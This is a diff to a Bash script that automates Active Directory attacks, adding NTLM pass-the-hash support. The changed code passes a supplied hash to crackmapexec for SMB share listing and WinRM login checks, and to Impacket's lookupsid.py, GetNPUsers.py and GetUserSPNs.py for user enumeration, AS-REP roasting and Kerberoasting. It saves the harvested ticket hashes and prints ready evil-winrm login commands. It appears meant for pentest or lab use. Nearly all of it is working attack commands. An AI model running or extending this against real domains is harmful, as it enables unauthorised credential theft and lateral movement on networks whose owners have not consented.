@@ -5,7 +5,8 @@ username=''
 password=''
 domain=''
 target=''
-pass_wordlist='rockyou.txt'
+hash=''
+pass_wordlist='/usr/share/wordlist/rockyou.txt'
 full_enabled=false
 smb_enabled=false
 kerberos_enabled=false
@@ -59,6 +60,10 @@ enum_smb(){
 	else 
 		crackmapexec smb $domain -u $username -p $password --shares  > $smb_file
 	fi
+	
+	if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
+	    crackmapexec smb $domain -u $username -H $hash --shares  > $smb_file
+	fi
 
 	if ! [ -s $smb_file ];then
 		echo -e "${RED} [-] Could not list SMB shares"
@@ -72,18 +77,30 @@ enum_winrm(){
 	# Enumerate winrm
 	echo -e "${ORANGE} [*] Enumerating winrm...${RESET}"
 	echo -e "${PURPLE} [!] Trying to log in with winrm using Crackmapexec${RESET}"
-	
+	winrm_results=''
+	# work with username and password 
 	if ! [ -z "$username" ] && ! [ -z "$password" ]; then
 	    winrm_results=$(crackmapexec winrm $domain -u $username -p $password | awk '$5 == "[+]" {print $6}')
 	    if [ -z $winrm_results ]; then
 	    	echo -e "${RED} [-] User $username can not log in with winrm${RESET}"
 	    else 
 	    	echo -e "${GREEN} [+] User $username can log in with winrm${RESET}"
-	    	echo -e "${GREEN} [+] Login to winrm using (evil-winrm -u  $username -p $password -i $domain)${RESET}"
+	    	echo -e "${GREEN} [+] Login to winrm using ${ORANGE}evil-winrm -u  $username -p $password -i $domain ${RESET}"
 	    fi
-	else 
-		echo -e "${RED} [-] User $username can not log in with winrm${RESET}"
 	fi
+	
+	# work with username and hash
+	if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
+	    winrm_results=$(crackmapexec winrm $domain -u $username -H $hash | awk '$5 == "[+]" {print $6}')
+	    if [ -z $winrm_results ]; then
+	    	echo -e "${RED} [-] User $username can not log in with winrm${RESET}"
+	    else 
+		 echo -e "${GREEN} [+] User $username can log in with winrm${RESET}"
+		 echo -e "${GREEN} [+] Login to winrm using ${ORANGE} evil-winrm -u  $username -H $hash -i $domain ${RESET}"
+	    fi
+	fi
+	
+	
 }
 
 smb_conn(){
@@ -113,6 +130,8 @@ enum_lookup(){
 	# Enumerate Lookupsids 
 	echo -e "${ORANGE} [*] Enumerating Users With Lookupsids...${RESET}"
 	echo -e "${PURPLE} [!] Running lookupsid.py${RESET}"
+	
+	# work with username and password
 	if [ -z "$username" ] || [ -z "$password" ]; then
 	    lookupsid.py $domain -no-pass    > $lookupsid_file 
 	    if ! [ -s $lookupsid_file ] || grep -q "[-]" "$lookupsid_file"; then
@@ -121,6 +140,12 @@ enum_lookup(){
 	else 
 		lookupsid.py $domain/$username:$password@$domain    > $lookupsid_file 
 	fi
+	
+	# work with username and ntlm hash
+	if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
+		lookupsid.py $domain/$username@$domain   -hashes ":$hash" > $lookupsid_file 
+	fi
+	
 
 	#retrieve users from the file
 	cat $lookupsid_file |  awk -F '[:\\\\(\\)]' '/SidTypeUser/ {print $3}' > $users_file
@@ -141,6 +166,7 @@ enum_kerberos(){
 	echo -e "${PURPLE} [!] Running GetNPUsers.py${RESET}"
 	#Request hashes using GetNPUsers.py
 	if  [ -s $users_file ]; then
+		# work with username and password 
 		if [ -z "$username" ] || [ -z "$password" ]; then
 	    		GetNPUsers.py $domain/guest@$domain -no-pass -usersfile $users_file | grep '^$krb5asrep' > $get_np_users_file
 			if ! [ -s $get_np_users_file ] || grep -q "[-] Error" "$get_np_users_file"; then
@@ -149,13 +175,20 @@ enum_kerberos(){
 		else 
 			GetNPUsers.py $domain/$username:$password@$domain -usersfile $users_file | grep '^$krb5asrep' > $get_np_users_file 
 		fi
+		
+		# work with username and ntlm hash
+		if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
+			GetNPUsers.py $domain/$username@$domain -usersfile $users_file  -hashes ":$hash" | grep '^$krb5asrep' > $get_np_users_file 
+		fi
+		
 		echo -e "${GREEN} [+] GetNPUsers Results Saved To ${get_np_users_file}${RESET}"
 	else 
 		echo -e "${RED} [-] Could not perform kerberoasting with NPUsers"
 		rm -rf $get_np_users_file
 	fi
-	echo -e "${PURPLE} [!] Running GetUserSPNs.py"
+	echo -e "${PURPLE} [!] Running GetUserSPNs.py${RESET}"
 	# Request hashes using GetUserSPNs.py
+	# work with username and password 
 	if [ -z "$username" ] || [ -z "$password" ]; then
 	    	GetUserSPNs.py $domain/$username@$domain -no-pass -request | grep '^$krb5tgs' > $get_user_spn_file
 		if ! [ -s $get_user_spn_file ]; then
@@ -164,6 +197,12 @@ enum_kerberos(){
 	else 
 	    	GetUserSPNs.py $domain/$username:$password@$domain -request | grep '^$krb5tgs' > $get_user_spn_file  
 	fi
+	
+	# work with username and ntlm hash
+	if ! [ -z "$username" ] && ! [ -z "$hash" ]; then
+		GetUserSPNs.py $domain/$username@$domain -request  -hashes ":$hash" | grep '^$krb5tgs' > $get_user_spn_file  
+	fi
+	
 	if  [ -s $get_user_spn_file ] || grep -q "[-] Error" "$get_user_spn_file"; then
 		echo -e "${GREEN} [+] GetUserSPNs Results Saved To ${get_user_spn_file}${RESET}"
 	else
@@ -226,10 +265,11 @@ remove_empty(){
 
 # Function to display display_usage information
 display_usage() {
-    echo "Usage: $0 -u 'username' -p 'password' -t 'target' -w 'wordlist' [--full] [--crack] [--shares] [--ldap] [--smb] [--winrm]"
+    echo "Usage: $0 -u 'username' -p 'password' -t 'target' -H 'ntlm hash' -w 'wordlist' [--full] [--crack] [--shares] [--ldap] [--smb] [--winrm]"
     echo "Options:"
     echo "  -u     		Username for authentication"
     echo "  -p   		Password for authentication"
+    echo "  -H   		NTLM Hash for authentication"
     echo "  -t       		Target host or IP address"
     echo "  -w       		Password list (default: rockyou.txt)"
     echo "  --kerberos          Enable kerberoasting"
@@ -243,12 +283,13 @@ display_usage() {
 }
 
 # Parse command-line options
-while getopts ":u:p:t:w:-:h" opt; do
+while getopts ":u:p:t:w:H:-:h" opt; do
     case $opt in
         u) username="$OPTARG" ;;
         p) password="$OPTARG" ;;
         t) target="$OPTARG" ;;
         w) wordlist="$OPTARG" ;;
+        H) hash="$OPTARG" ;;
         -)
             case "${OPTARG}" in
                 kerberos|ldap|smb|full|crack|winrm) eval "${OPTARG}_enabled=true" ;;
